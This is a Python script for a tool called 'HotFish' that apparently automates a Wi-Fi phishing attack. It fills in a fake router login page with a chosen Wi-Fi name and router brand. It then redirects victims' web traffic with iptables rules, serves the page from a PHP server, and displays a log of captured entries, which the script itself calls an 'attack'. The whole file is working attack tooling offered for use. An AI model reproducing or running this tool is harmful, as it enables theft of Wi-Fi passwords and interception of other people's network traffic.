import os
import zipfile
import shutil
import time
from termcolor import colored  # Make sure to install termcolor using: pip install termcolor

# Function to clear the terminal
def clear_terminal():
    os.system('clear' if os.name == 'posix' else 'cls')

# Function to print text in rainbow color
def print_rainbow_text(text):
    rainbow_colors = ['red', 'yellow', 'green', 'cyan', 'blue', 'magenta']
    rainbow_text = ''
    for i in range(len(text)):
        rainbow_text += colored(text[i], rainbow_colors[i % len(rainbow_colors)])
    print(rainbow_text)

# Function to run the specified commands
def run_commands(commands):
    for command in commands:
        os.system(command)

def run_option():
    print(colored("1. Captive\n2. Wifi\n", 'green'))
    run_input = input("Which one > ")
    if run_input.lower() == "captive" or run_input == "1":
        captive_option()
    elif run_input.lower() == "wifi" or run_input == "2":
        wifi_option()
    else:
        main_menu()
# Function to handle the "Run" option
def captive_option():
    if not os.path.exists("Captive/"):
        print(colored("Looks like captive.zip not extracted yet\n let me do it for you", 'red'))
        time.sleep(3)
        os.system("unzip Captive.zip")
        main_menu()
    else:
        if os.path.exists("ip.txt"):
            with open("ip.txt", "r") as file:
                ip_content = file.read().strip()
            if ip_content:
                run_commands([
                    "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
                    "iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
                    "iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
                    f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {ip_content}",
                    "iptables -P FORWARD DROP",
                    "php -S 0.0.0.0 -t Captive/"
                ])
            else:
                print("IP isn't mentioned yet. You have to mention one.")
                new_ip = input("Enter the IP: ")
                with open("ip.txt", "w") as file:
                    file.write(new_ip)
        else:
            print("ip.txt file is missing")

# Function to handle the "Run" option
def wifi_option():
    if not os.path.exists("Server/server.php") or not os.path.exists("Server/index.html") or not os.path.exists("Server/log.txt"):
        print(colored("You didn't even compile yet", 'red'))
    else:
        if os.path.exists("ip.txt"):
            with open("ip.txt", "r") as file:
                ip_content = file.read().strip()
            if ip_content:
                run_commands([
                    "iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080",
                    "iptables -A FORWARD -p udp --dport 53 -j ACCEPT",
                    "iptables -A FORWARD -p udp --sport 53 -j ACCEPT",
                    f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination {ip_content}",
                    "iptables -P FORWARD DROP",
                    "php -S 0.0.0.0:8080 -t Server/"
                ])
            else:
                print("IP isn't mentioned yet. You have to mention one.")
                new_ip = input("Enter the IP: ")
                with open("ip.txt", "w") as file:
                    file.write(new_ip)
        else:
            print("ip.txt file is missing")
            
# Function to handle the "Compile" option
def compile_option():
    if os.path.exists("Server/compile.php") or os.path.exists("Server/compile.html") or os.path.exists("Server/compile.txt"):
        print(colored("Files are incomplete/corrupted", 'red'))
        time.sleep(3)  # Pause for 3 seconds before returning to the main menu
        main_menu()
    else:
        with zipfile.ZipFile("backpack.zip", "r") as zip_ref:
            zip_ref.extractall("Server")
        print(colored("We are going to compile the files, so be careful otherwise files strings may get corrupt", 'red'))

        with open("Server/compile.html", "r") as html_file:
            html_content = html_file.read()
            wifiname = input(colored("Enter wifi name: ", 'green'))
            routername = input(colored("Enter router company name: ", 'green'))
            html_content = html_content.replace("$wifiname", wifiname)
            html_content = html_content.replace("$routername", routername)

        with open("Server/compile.php", "r") as php_file:
            php_content = php_file.read()
            hashpath = input(colored("Enter hash file full path: ", 'green'))
            php_content = php_content.replace("$hashpath", hashpath)

        with open("Server/compile.html", "w") as html_file:
            html_file.write(html_content)

        with open("Server/compile.php", "w") as php_file:
            php_file.write(php_content)

        os.rename("Server/compile.php", "Server/server.php")
        os.rename("Server/compile.html", "Server/index.html")
        os.rename("Server/compile.txt", "Server/log.txt")

# Function to handle the "Log" option
def log_option():
    if os.path.exists("Server/log.txt"):
        os.system("cat Server/log.txt")
    else:
        print("Looks like an attack was never performed or log.txt not found")

# Function to handle the "Remove" option
def remove_option():
    if os.path.exists("Server/index.html") or os.path.exists("Server/server.php") or os.path.exists("Server/log.txt"):
        print(colored("Warning: This will delete logs. Before you delete, make sure to backup your logs.", 'red'))
        user_input = input(colored("Do you want to continue? (y/n): ", 'red')).lower()
        if user_input == 'y':
            os.remove("Server/index.html")
            os.remove("Server/server.php")
            os.remove("Server/log.txt")
    else:
        print("No files to remove.")

# Main menu function
def main_menu():
    try:
        while True:
            clear_terminal()
            print_rainbow_text("HotFish")
            print()
            print(colored("1. Run\n2. Compile\n3. Print log file\n4. Remove old compile files\n5. Exit", 'white'))
            print()

            user_input = input("Enter your choice: ")

            if user_input.lower() == "run" or user_input == "1":
                run_option()
            elif user_input.lower() == "compile" or user_input == "2":
                compile_option()
            elif user_input.lower() == "log" or user_input == "3":
                log_option()
            elif user_input.lower() == "remove" or user_input == "4":
                remove_option()
            elif user_input.lower() == "exit" or user_input == "5":
                print(colored("Ok quitting the job", 'green'))
                exit()

            time.sleep(5)  # Pause for 5 seconds before displaying options again

    except KeyboardInterrupt:
        print(colored("\nOk quitting the job", 'green'))
        exit()

# Start the main menu
main_menu()
